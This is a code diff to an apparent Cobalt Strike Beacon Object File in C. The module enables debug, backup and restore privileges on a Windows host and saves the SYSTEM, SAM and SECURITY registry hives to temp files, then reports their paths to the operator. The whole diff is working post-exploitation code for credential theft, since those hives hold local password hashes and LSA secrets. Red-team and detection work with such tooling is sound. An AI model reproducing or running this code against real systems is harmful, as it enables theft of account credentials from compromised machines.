@@ -1,5 +1,8 @@
 #include "common.h"
 
+WINBASEAPI WINBOOL WINAPI KERNEL32$DeleteFileA (LPCTSTR lpFileName);
+DECLSPEC_IMPORT LONG WINAPI KERNEL32$GetTempPathA(DWORD,LPSTR);
+DECLSPEC_IMPORT UINT WINAPI KERNEL32$GetTempFileNameA(LPCSTR,LPCSTR,UINT,LPSTR);
 
 void EnableDebugPriv( LPCSTR priv ) 
 {
@@ -34,19 +37,20 @@ void EnableDebugPriv( LPCSTR priv )
 	KERNEL32$CloseHandle( hToken );
 }
 
-void ExportRegKey(LPCSTR subkey, LPCSTR outFile)
+BOOL ExportRegKey(LPCSTR subkey, LPCSTR outFile)
 {
+	BOOL result = FALSE;
 	HKEY hSubKey;
 	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
     if(ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,subkey,REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_ALL_ACCESS,&hSubKey)==ERROR_SUCCESS)
     {
         if (ADVAPI32$RegSaveKeyA(hSubKey, outFile, lpSecurityAttributes)==ERROR_SUCCESS)
 		{
-			BeaconPrintf(CALLBACK_OUTPUT,"[*] Exported HKLM\\%s at %s\n", subkey, outFile);
+			result = TRUE;
 		}
 		else
 		{
-			BeaconPrintf(CALLBACK_ERROR,"[*] RegSaveKey failed.");
+			BeaconPrintf(CALLBACK_ERROR,"[*] RegSaveKey failed (%s).", subkey);
 		}
 		
         ADVAPI32$RegCloseKey(hSubKey);
@@ -55,48 +59,52 @@ void ExportRegKey(LPCSTR subkey, LPCSTR outFile)
 	{
 		BeaconPrintf(CALLBACK_ERROR,"[*] Could not open key %s",subkey);
 	}
+   return result;
 }
 
 void go(char * args, int alen)
 {
-	datap parser;
+    	formatp mwrout;
+    	BeaconFormatAlloc(&mwrout,1024);
 
-	char buffer_1[MAX_PATH] = "";
-	char *lpStr1;
-	lpStr1 = buffer_1;
-	
-	char buffer_sam[ ] = "samantha.txt";
-	char *lpStrsam;
-	lpStrsam = buffer_sam;
-
-	char buffer_sys[ ] = "systemic.txt";
-	char *lpStrsys;
-	lpStrsys = buffer_sys;
-
-	char buffer_sec[ ] = "security.txt";
-	char *lpStrsec;
-	lpStrsec = buffer_sec;
+	char tmpPath[MAX_PATH] = "";
+	char tmpFileSAM[MAX_PATH] = "";
+	char tmpFileSECURITY[MAX_PATH] = "";
+	char tmpFileSYSTEM[MAX_PATH] = "";
 
 	if (!BeaconIsAdmin()){
-		BeaconPrintf(CALLBACK_ERROR, "Admin privileges required to use this module!");
-		return;
+	  BeaconPrintf(CALLBACK_ERROR, "Admin privileges required to use this module!");
+	  return;
 	}
 	
-	BeaconDataParse(&parser, args, alen); // Parsing arguments from cna
-	char * dir;
-	dir = BeaconDataExtract(&parser, NULL);
+	// Get temporary file names
+	KERNEL32$GetTempPathA(MAX_PATH, (char *) &tmpPath);
+	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSAM);
+	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSECURITY);
+	KERNEL32$GetTempFileNameA((char *) &tmpPath, "tmp", 0, (char *) &tmpFileSYSTEM);
 
 	//Enabling required privileges for reg operations
 	EnableDebugPriv(SE_DEBUG_NAME);
 	EnableDebugPriv(SE_RESTORE_NAME);
 	EnableDebugPriv(SE_BACKUP_NAME);
 
-	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsys);
-	ExportRegKey("SYSTEM",lpStr1); //exporting SYSTEM
+	// RegSave needs the files to not exist
+	KERNEL32$DeleteFileA((char *) &tmpFileSAM);
+	KERNEL32$DeleteFileA((char *) &tmpFileSECURITY);
+	KERNEL32$DeleteFileA((char *) &tmpFileSYSTEM);
 
-	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsam);
-	ExportRegKey("SAM",lpStr1); //exporting SAM
+	if (ExportRegKey("SYSTEM", (char *) &tmpFileSYSTEM))
+       	  BeaconFormatPrintf(&mwrout,"regsave: SYSTEM hive saved to %s\n", &tmpFileSYSTEM);
+	
+	if (ExportRegKey("SAM", (char *) &tmpFileSAM))
+          BeaconFormatPrintf(&mwrout,"regsave: SAM hive saved to %s\n", &tmpFileSAM);
 
-	SHLWAPI$PathCombineA(lpStr1,dir,lpStrsec);
-	ExportRegKey("SECURITY",lpStr1); //exporting SECURITY
+	if (ExportRegKey("SECURITY", (char *) &tmpFileSECURITY))
+          BeaconFormatPrintf(&mwrout,"regsave: SECURITY hive saved to %s\n", &tmpFileSECURITY);
+
+        int outSize = 0;
+        char* dataOut = BeaconFormatToString(&mwrout, &outSize);
+        BeaconOutput(CALLBACK_OUTPUT, dataOut, outSize);
+
+	BeaconFormatFree(&mwrout);
 };
